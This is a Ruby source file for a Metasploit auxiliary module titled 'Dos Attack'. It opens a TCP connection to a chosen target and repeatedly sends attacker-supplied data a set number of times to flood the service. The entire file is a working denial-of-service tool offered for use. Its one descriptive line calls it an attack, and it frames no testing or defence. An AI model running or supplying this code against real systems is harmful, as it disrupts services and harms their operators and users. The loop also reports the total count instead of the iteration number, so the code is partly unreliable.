require "msf/core"
class MetasploitModule < Msf::Auxiliary
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Dos
	include Msf::Exploit::Remote::Tcp
	Rank = GreatRanking
	def initialize(info = {})
		super(update_info(info,

				'Name' => 'Dos Attack',
				'Description' => %q{
					denial of service attack auxiliary
				},
				'Author' => ['Abd El Rahman HSN <abdelrahmanhsn1@gmail.com>'],
				'License' => MSF_LICENSE,
				'Version' => '1.0'))
		register_options(
			[

				OptString.new('DATA',[true,'attack data']),
				OptString.new('TIMES',[true,'times of attack']),

			],self.class)
	end
	def run
			begin
				connect
				print_status("start attack")
				for attack in (1..datastore["TIMES"].to_i)
					sock.put(datastore["DATA"])
					print_good("attack number #{datastore["TIMES"]} is good")
				end
				disconnect
			rescue ::Rex::ConnectionRefused
				print_error("connection is refused")
			end
	end
end
